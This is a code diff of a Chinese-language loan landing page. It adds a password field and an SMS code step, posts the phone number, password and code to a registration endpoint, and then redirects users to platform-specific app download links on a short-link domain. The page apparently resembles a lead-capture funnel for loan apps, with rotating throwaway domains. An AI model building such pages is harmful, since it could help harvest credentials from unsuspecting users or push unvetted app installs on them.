@@ -84,46 +84,46 @@
                 <div id="tel_input"  class="text_con">
                     <input class="phone1" type="tel" maxlength="11" placeholder="请输入手机号" id="phone"></div>
             </div>
-            <div id="sms_box" class="ver_mod" style="display:none;">
+            <div id="sms_box" class="ver_mod">
                 <div class="text_con">
                     <input class="code" type="number" placeholder="请输入验证码" id="sms_input"
                            oninput="if(value.length>4)value=value.slice(0,6);value = value.replace(/[^0-9]+/, '');">
                     <button style="border:0;outline:none;" class="getcode_btn get_code_btn" id="getCodeBtn" onclick="send()">获取验证码</button></div>
             </div>
             <div>
-            <div id="money_box"  class="text_con" style="margin-top:.25rem;">
-                    <input class="password" type="text" placeholder="请输入姓名" id="password"></div>
+                <div id="money_box"  class="text_con" style="margin-top:.25rem;">
+                    <input class="password" type="password" placeholder="请输入密码" id="password"></div>
             </div>
-          <!--  <div id="money_box" style="margin-top:.25rem;">
-                <div class="text_con">
-                    &lt;!&ndash;<input id="home_input" class="home" type="number" length='10' placeholder="请输入您房屋的面积" />
-                   <span  style="line-height: .8rem;height: .8rem;font-size: .32rem;color: #333;">平方米</span>
-                       &ndash;&gt;<select id= money_input class="select money " style="color:grey;">
-                    <option value="">请选择您的期望额度</option>
-                    <option value="10万" title="">10万</option>
-                    <option value="11万" title="">11万</option>
-                    <option value="12万" title="">12万</option>
-                    <option value="13万" title="">13万</option>
-                    <option value="14万" title="">14万</option>
-                    <option value="15万" title="">15万</option>
-                    <option value="16万" title="">16万</option>
-                    <option value="17万" title="">17万</option>
-                    <option value="18万" title="">18万</option>
-                    <option value="19万" title="">19万</option>
-                    <option value="20万" title="">20万</option>
-                    <option value="21万" title="">21万</option>
-                    <option value="22万" title="">22万</option>
-                    <option value="23万" title="">23万</option>
-                    <option value="24万" title="">24万</option>
-                    <option value="25万" title="">25万</option>
-                    <option value="26万" title="">26万</option>
-                    <option value="27万" title="">27万</option>
-                    <option value="28万" title="">28万</option>
-                    <option value="29万" title="">29万</option>
-                    <option value="30万" title="">30万</option>
-                </select>
-                </div>
-            </div>-->
+            <!--  <div id="money_box" style="margin-top:.25rem;">
+                  <div class="text_con">
+                      &lt;!&ndash;<input id="home_input" class="home" type="number" length='10' placeholder="请输入您房屋的面积" />
+                     <span  style="line-height: .8rem;height: .8rem;font-size: .32rem;color: #333;">平方米</span>
+                         &ndash;&gt;<select id= money_input class="select money " style="color:grey;">
+                      <option value="">请选择您的期望额度</option>
+                      <option value="10万" title="">10万</option>
+                      <option value="11万" title="">11万</option>
+                      <option value="12万" title="">12万</option>
+                      <option value="13万" title="">13万</option>
+                      <option value="14万" title="">14万</option>
+                      <option value="15万" title="">15万</option>
+                      <option value="16万" title="">16万</option>
+                      <option value="17万" title="">17万</option>
+                      <option value="18万" title="">18万</option>
+                      <option value="19万" title="">19万</option>
+                      <option value="20万" title="">20万</option>
+                      <option value="21万" title="">21万</option>
+                      <option value="22万" title="">22万</option>
+                      <option value="23万" title="">23万</option>
+                      <option value="24万" title="">24万</option>
+                      <option value="25万" title="">25万</option>
+                      <option value="26万" title="">26万</option>
+                      <option value="27万" title="">27万</option>
+                      <option value="28万" title="">28万</option>
+                      <option value="29万" title="">29万</option>
+                      <option value="30万" title="">30万</option>
+                  </select>
+                  </div>
+              </div>-->
 
             <!-- <div id="money_box" style="margin-top:.25rem;">
                 <div class="text_con">
@@ -151,7 +151,7 @@
             <!--			</div> -->
 
             <div>
-                <div class="text_con" id="submit_btn" onclick="tijiao()">看看我能贷多少</div>
+                <div class="text_con" id="submit_btn" onclick="add()">看看我能贷多少</div>
             </div>
             <!--  <p class="choice-agreement">“身份证/信用分/银行卡号/手机号”点击申请
                 </p>  -->
@@ -257,16 +257,12 @@
     var ctx2 = canvas2.getContext('2d');
     ctx2.lineWidth = 8;
     ctx2.strokeStyle = "#3F475F";
-    
     //画底部的灰色圆环
     ctx2.beginPath();
     ctx2.arc(150, 100, 73, Math.PI * 0.85, Math.PI * 2.15, false);
     // ctx2.closePath();
     ctx2.stroke();
 
-    do{
-	var code = Math.floor(Math.random()*10000);
-	}while( code < 1000 );
     //画半环形
     var canvas = document.getElementById('canvas');
     var ctx = canvas.getContext('2d');
@@ -347,45 +343,6 @@
         }, 60);
     }
 
-	function tijiao(){
-		var tags_temp = [];
-        for (var n = 1; n <= 8; n++) {
-            var index = "#btn_" + n;
-            var temp = $(index).attr("name");
-            if (temp == 1) {
-                tags_temp.push($(index).val());
-            }
-        }
-        var tags = tags_temp.join(',');
-        var phone = $(".phone1").val();
-        var code = $(".code").val();
-        // var type=$(".type").val();
-        var name = $('.name').val();
-        var home = $('.home').val();
-        var money = $('.money').val();
-        var password = $("#password").val();
-        if (phone == null || phone == "") {
-            landConfig.popupCover({
-                content: "请填写您的手机号码!"
-            });
-            return false;
-        }
-        if (!/^1[34578]{1}[0-9]{9}$/.test(phone)) {
-            landConfig.popupCover({
-                content: "请正确填写您的手机号码!"
-            });
-            return false;
-        }
-        if (password == "" || password == null) {
-            landConfig.popupCover({
-                content: "请填写您的姓名!"
-            });
-            return false;
-        }
-		alert("您的申请额度已获取，请下载APP查看。");
-		window.location.href = 'http://www.prwmhk.cn/531HKkcT5m';
-	}
-	
     function add() {
         var tags_temp = [];
         for (var n = 1; n <= 8; n++) {
@@ -440,17 +397,29 @@
                 username: phone,
                 password: password,
                 code: code,
-                source: 'www.nrtbf3d.cn',
+                source: 'www.mdahan.cn',
             },
             type: "post",
             success: function (data) {
                 if (data.status == 1) {
                     alert('注册成功');
-                    window.location.href = 'http://www.nrtbf3d.cn/load/';
+                    if (isAndroid === true) {
+                        window.location.href = 'https://d.bccji.com/p/A0xx15w9dp7';
+                    }
+                    if (isIOS === true) {
+                        window.location.href = 'https://d.bccji.com/p/A0hrwog3sim';
+                    }
                 } else {
                     alert(data.info);
                     if (data.info == '当前手机号已注册,请登录') {
-                        window.location.href = 'http://www.nrtbf3d.cn/load/';
+                        if (isAndroid === true) {
+                            window.location.href = 'https://d.bccji.com/p/A0xx15w9dp7';
+                        }
+                        if (isIOS === true) {
+                            window.location.href = 'https://d.bccji.com/p/A0hrwog3sim';
+
+
+                        }
 
                     }
                 }
@@ -461,7 +430,6 @@
 </script>
 
 
-<script type="text/javascript" src="https://v1.cnzz.com/z_stat.php?id=1278887433&web_id=1278887433"></script>
 </body>
 
 </html>
